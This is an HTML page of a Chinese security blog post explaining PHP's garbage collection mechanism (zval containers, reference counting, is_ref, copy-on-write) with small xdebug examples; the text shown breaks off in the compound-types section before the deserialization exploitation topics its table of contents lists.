<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="0x01 前言 之前总结了wakeup的绕过方法但是其中的两种姿势，其实都是和这个GC的回收机制有关系所以我来浅浅的解析一下，会自己的姿势库分析一下，嘿嘿\n0x02 question GC是啥 PHP 的垃圾回收机制（Garbage Collection, GC）是用于管理内存分配的一个自动化过程，主要针对循环引用的内存泄漏问题。它是在 PHP 5.3 之后引入的增强功能，帮助开发者自动管理内存，尤其是在复杂的应用场景下。\n那么它是根据什么来定位哪些可以回收的呢，引用计数和回收周期，这两个东西是啥啊？\n引用计数 引用计数是一种内存管理技术，用来记录一个值或对象被多少个变量引用。每当一个变量指向某个值时，引用计数就会增加；当某个变量不再引用该值时，引用计数就会减少。当引用计数降为 0 时，表示没有变量再使用这个值，系统会将其占用的内存释放。\n1 2 3 4 5 <?php $a=&#34;baozongwi&#34;; xdebug_debug_zval(&#34;a&#34;); /* a: (refcount=1, is_ref=0)='baozongwi' 看到这段代码，怎么来的，来分析一下\n每个php变量存在一个叫zval的变量容器中。 一个zval变量容器，除了包含变量的类型和值，还包括两个字节的额外信息。 这两个额外信息，第一个是is_ref，是个bool值，用来标识这个变量是否是属于引用集合。通过这个字节，php引擎才能把普通变量和引用变量区分开来，由于php允许用户通过使用&来使用自定义引用，zval变量容器中还有一个内部引用计数机制，来优化内存使用。 第二个额外字节是 refcount，用以表示指向这个zval变量容器的变量个数。 所有的符号存在一个符号表中，其中每个符号都有作用域(scope)，那些主脚本(比如：通过浏览器请求的的脚本)和每个函数或者方法也都有作用域。 那么开始测试\n标量 1 2 3 4 5 6 7 <?php $a = &#34;baozongwi&#34;; $b = $a; // $a 和 $b 引用相同的字符串，refcount 应为 2 xdebug_debug_zval('a'); // 检查 $a 的 refcount /* a: (refcount=1, is_ref=0)='baozongwi' 这里我们预期上其实应该是2的，因为变量个数所增加了，但是实际上为啥是1呢，通过查阅我发现，原来内部机制是这样\nPHP 使用了一种称为 写时复制（Copy-on-Write, COW） 的内存优化机制，这意味着当你将 $a 的值赋给 $b 时，PHP 并不会立即复制该值，而是让 $b 和 $a 指向同一个内存块，直到其中一个变量被修改。\n"><title>php GC回收机制以及常见利用利用方式</title><link rel=canonical href=https://baozongwi.xyz/p/php-gc-mechanism-and-common-exploitation/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="php GC回收机制以及常见利用利用方式"><meta property='og:description' content="0x01 前言 之前总结了wakeup的绕过方法但是其中的两种姿势，其实都是和这个GC的回收机制有关系所以我来浅浅的解析一下，会自己的姿势库分析一下，嘿嘿\n0x02 question GC是啥 PHP 的垃圾回收机制（Garbage Collection, GC）是用于管理内存分配的一个自动化过程，主要针对循环引用的内存泄漏问题。它是在 PHP 5.3 之后引入的增强功能，帮助开发者自动管理内存，尤其是在复杂的应用场景下。\n那么它是根据什么来定位哪些可以回收的呢，引用计数和回收周期，这两个东西是啥啊？\n引用计数 引用计数是一种内存管理技术，用来记录一个值或对象被多少个变量引用。每当一个变量指向某个值时，引用计数就会增加；当某个变量不再引用该值时，引用计数就会减少。当引用计数降为 0 时，表示没有变量再使用这个值，系统会将其占用的内存释放。\n1 2 3 4 5 <?php $a=&#34;baozongwi&#34;; xdebug_debug_zval(&#34;a&#34;); /* a: (refcount=1, is_ref=0)='baozongwi' 看到这段代码，怎么来的，来分析一下\n每个php变量存在一个叫zval的变量容器中。 一个zval变量容器，除了包含变量的类型和值，还包括两个字节的额外信息。 这两个额外信息，第一个是is_ref，是个bool值，用来标识这个变量是否是属于引用集合。通过这个字节，php引擎才能把普通变量和引用变量区分开来，由于php允许用户通过使用&来使用自定义引用，zval变量容器中还有一个内部引用计数机制，来优化内存使用。 第二个额外字节是 refcount，用以表示指向这个zval变量容器的变量个数。 所有的符号存在一个符号表中，其中每个符号都有作用域(scope)，那些主脚本(比如：通过浏览器请求的的脚本)和每个函数或者方法也都有作用域。 那么开始测试\n标量 1 2 3 4 5 6 7 <?php $a = &#34;baozongwi&#34;; $b = $a; // $a 和 $b 引用相同的字符串，refcount 应为 2 xdebug_debug_zval('a'); // 检查 $a 的 refcount /* a: (refcount=1, is_ref=0)='baozongwi' 这里我们预期上其实应该是2的，因为变量个数所增加了，但是实际上为啥是1呢，通过查阅我发现，原来内部机制是这样\nPHP 使用了一种称为 写时复制（Copy-on-Write, COW） 的内存优化机制，这意味着当你将 $a 的值赋给 $b 时，PHP 并不会立即复制该值，而是让 $b 和 $a 指向同一个内存块，直到其中一个变量被修改。\n"><meta property='og:url' content='https://baozongwi.xyz/p/php-gc-mechanism-and-common-exploitation/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='php'><meta property='article:published_time' content='2024-09-14T18:58:51+00:00'><meta property='article:modified_time' content='2024-09-14T18:58:51+00:00'><meta name=twitter:title content="php GC回收机制以及常见利用利用方式"><meta name=twitter:description content="0x01 前言 之前总结了wakeup的绕过方法但是其中的两种姿势，其实都是和这个GC的回收机制有关系所以我来浅浅的解析一下，会自己的姿势库分析一下，嘿嘿\n0x02 question GC是啥 PHP 的垃圾回收机制（Garbage Collection, GC）是用于管理内存分配的一个自动化过程，主要针对循环引用的内存泄漏问题。它是在 PHP 5.3 之后引入的增强功能，帮助开发者自动管理内存，尤其是在复杂的应用场景下。\n那么它是根据什么来定位哪些可以回收的呢，引用计数和回收周期，这两个东西是啥啊？\n引用计数 引用计数是一种内存管理技术，用来记录一个值或对象被多少个变量引用。每当一个变量指向某个值时，引用计数就会增加；当某个变量不再引用该值时，引用计数就会减少。当引用计数降为 0 时，表示没有变量再使用这个值，系统会将其占用的内存释放。\n1 2 3 4 5 <?php $a=&#34;baozongwi&#34;; xdebug_debug_zval(&#34;a&#34;); /* a: (refcount=1, is_ref=0)='baozongwi' 看到这段代码，怎么来的，来分析一下\n每个php变量存在一个叫zval的变量容器中。 一个zval变量容器，除了包含变量的类型和值，还包括两个字节的额外信息。 这两个额外信息，第一个是is_ref，是个bool值，用来标识这个变量是否是属于引用集合。通过这个字节，php引擎才能把普通变量和引用变量区分开来，由于php允许用户通过使用&来使用自定义引用，zval变量容器中还有一个内部引用计数机制，来优化内存使用。 第二个额外字节是 refcount，用以表示指向这个zval变量容器的变量个数。 所有的符号存在一个符号表中，其中每个符号都有作用域(scope)，那些主脚本(比如：通过浏览器请求的的脚本)和每个函数或者方法也都有作用域。 那么开始测试\n标量 1 2 3 4 5 6 7 <?php $a = &#34;baozongwi&#34;; $b = $a; // $a 和 $b 引用相同的字符串，refcount 应为 2 xdebug_debug_zval('a'); // 检查 $a 的 refcount /* a: (refcount=1, is_ref=0)='baozongwi' 这里我们预期上其实应该是2的，因为变量个数所增加了，但是实际上为啥是1呢，通过查阅我发现，原来内部机制是这样\nPHP 使用了一种称为 写时复制（Copy-on-Write, COW） 的内存优化机制，这意味着当你将 $a 的值赋给 $b 时，PHP 并不会立即复制该值，而是让 $b 和 $a 指向同一个内存块，直到其中一个变量被修改。\n"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#gc是啥>GC是啥</a><ol><li><a href=#引用计数>引用计数</a><ol><li><a href=#标量>标量</a></li><li><a href=#复合>复合</a></li></ol></li><li><a href=#回收周期>回收周期</a><ol><li><a href=#php-52>php &lt;=5.2</a></li><li><a href=#php-5356>php 5.3&ndash;>5.6</a></li><li><a href=#php70>php>=7.0</a></li></ol></li></ol></li><li><a href=#反序列化的利用>反序列化的利用</a><ol><li><a href=#php>php</a><ol><li><a href=#绕过异常类>绕过异常类</a></li></ol></li><li><a href=#phar>phar</a><ol><li><a href=#demo-1-1>Demo 1</a></li><li><a href=#demo-2-1>Demo 2</a></li></ol></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/talk/>Talk</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/php-gc-mechanism-and-common-exploitation/>php GC回收机制以及常见利用利用方式</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2024-09-14T18:58:51Z>Sep 14, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>8 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
</span><span>友情提示：本文最后更新于 518 天前，文中的内容可能已有所发展或发生改变。</span></div><h1 id=0x01-前言>0x01 前言</h1><p>之前总结了wakeup的绕过方法但是其中的两种姿势，其实都是和这个GC的回收机制有关系所以我来浅浅的解析一下，会自己的姿势库分析一下，嘿嘿</p><h1 id=0x02-question>0x02 question</h1><h2 id=gc是啥>GC是啥</h2><blockquote><p>PHP 的垃圾回收机制（Garbage Collection, GC）是用于管理内存分配的一个自动化过程，主要针对循环引用的<strong>内存泄漏</strong>问题。它是在 <strong>PHP 5.3</strong> 之后引入的增强功能，帮助开发者自动管理内存，尤其是在复杂的应用场景下。</p></blockquote><p>那么它是根据什么来定位哪些可以回收的呢，<code>引用计数</code>和<code>回收周期</code>，这两个东西是啥啊？</p><h3 id=引用计数>引用计数</h3><blockquote><p>引用计数是一种内存管理技术，用来记录一个值或对象被多少个变量引用。每当一个变量指向某个值时，引用计数就会增加；当某个变量不再引用该值时，引用计数就会减少。当引用计数降为 0 时，表示没有变量再使用这个值，系统会将其占用的内存释放。</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=s2>&#34;baozongwi&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>xdebug_debug_zval</span><span class=p>(</span><span class=s2>&#34;a&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;baozongwi&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>看到这段代码，怎么来的，来分析一下</p><ul><li>每个<code>php</code>变量存在一个叫<code>zval</code>的变量容器中。</li><li>一个<code>zval</code>变量容器，除了包含变量的类型和值，还包括两个字节的额外信息。</li><li>这两个额外信息，第一个是<code>is_ref</code>，是个<code>bool</code>值，用来标识这个变量是否是属于引用集合。通过这个字节，php引擎才能把普通变量和引用变量区分开来，由于<code>php</code>允许用户通过使用&来使用自定义引用，zval变量容器中还有一个内部引用计数机制，来优化内存使用。</li><li>第二个额外字节是 <code>refcount</code>，用以表示指向这个<code>zval</code>变量容器的变量个数。</li><li>所有的符号存在一个符号表中，其中每个符号都有作用域(scope)，那些主脚本(比如：通过浏览器请求的的脚本)和每个函数或者方法也都有作用域。</li></ul><p>那么开始测试</p><h4 id=标量>标量</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=s2>&#34;baozongwi&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span> <span class=o>=</span> <span class=nv>$a</span><span class=p>;</span> <span class=c1>// $a 和 $b 引用相同的字符串，refcount 应为 2
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>xdebug_debug_zval</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>);</span> <span class=c1>// 检查 $a 的 refcount
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;baozongwi&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>这里我们预期上其实应该是2的，因为变量个数所增加了，但是实际上为啥是1呢，通过查阅我发现，原来内部机制是这样</p><blockquote><p>PHP 使用了一种称为 <strong>写时复制（Copy-on-Write, COW）</strong> 的内存优化机制，这意味着当你将 <code>$a</code> 的值赋给 <code>$b</code> 时，PHP 并不会立即复制该值，而是让 <code>$b</code> 和 <code>$a</code> 指向同一个内存块，直到其中一个变量被修改。</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=s2>&#34;baozongwi&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span> <span class=o>=</span> <span class=o>&amp;</span><span class=nv>$a</span><span class=p>;</span> <span class=c1>// $a 和 $b 引用相同的字符串，refcount 应为 2
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>xdebug_debug_zval</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>);</span> <span class=c1>// 检查 $a 的 refcount
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>2</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;baozongwi&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>这样子不就对了</p><p>那么，如何减少引用次数呢，也就是让我们不需要的东西被回收</p><p>也就是<code>unset</code>,使得变量被删除</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=s2>&#34;baozongwi&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span> <span class=o>=</span> <span class=o>&amp;</span><span class=nv>$a</span><span class=p>;</span>  <span class=c1>// 此时 $a 和 $b 引用相同的值，refcount 应为 2
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>xdebug_debug_zval</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>);</span>  <span class=c1>// 查看引用计数，refcount = 2
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>unset</span><span class=p>(</span><span class=nv>$b</span><span class=p>);</span>  <span class=c1>// 解除 $b 的引用
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>xdebug_debug_zval</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>);</span>  <span class=c1>// 查看引用计数，refcount 现在应为 1
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>2</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;baozongwi&#39;</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;baozongwi&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>但是对于简单标量(整数、浮点数、布尔值等)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>xdebug_debug_zval</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>//output -&gt; a: (refcount=0, is_ref=0)=1
</span></span></span><span class=line><span class=cl><span class=c1></span> 
</span></span><span class=line><span class=cl><span class=nv>$b</span> <span class=o>=</span> <span class=nv>$a</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>xdebug_debug_zval</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>//output -&gt; a: (refcount=0, is_ref=0)=1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=o>=</span> <span class=o>&amp;</span><span class=nv>$a</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>xdebug_debug_zval</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>//output -&gt; a: (refcount=2, is_ref=1)=1
</span></span></span></code></pre></td></tr></table></div></div><p>这是因为标量类型的值是不可变的，PHP 没有必要为这些简单值创建多个引用或进行内存管理。在 PHP 中，标量类型值的操作非常高效，所以 PHP 没有为它们维护 <code>refcount</code>。</p><p>当使用<code>&</code>引用后，<code>is_ref</code>区分引用变量，<code>refcount</code>变为了2。</p><h4 id=复合>复合</h4><blockquote><p>对于 <a class=link href=https://www.php.net/manual/zh/language.types.array.php target=_blank rel=noopener>array</a> 和 <a class=link href=https://www.php.net/manual/zh/language.types.object.php target=_blank rel=noopener>object</a> 这样的复合类型，情况会稍微复杂一些。与 scalar 值不同，<a class=link href=https://www.php.net/manual/zh/language.types.array.php target=_blank rel=noopener>array</a> 和 <a class=link href=https://www.php.net/manual/zh/language.types.object.php target=_blank rel=noopener>object</a> 的属性存储在自己的符号表中。这意味着以下示例将创建三个 zval 容器：</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span> <span class=s1>&#39;meaning&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;life&#39;</span><span class=p>,</span> <span class=s1>&#39;number&#39;</span> <span class=o>=&gt;</span> <span class=mi>42</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>xdebug_debug_zval</span><span class=p>(</span> <span class=s1>&#39;a&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
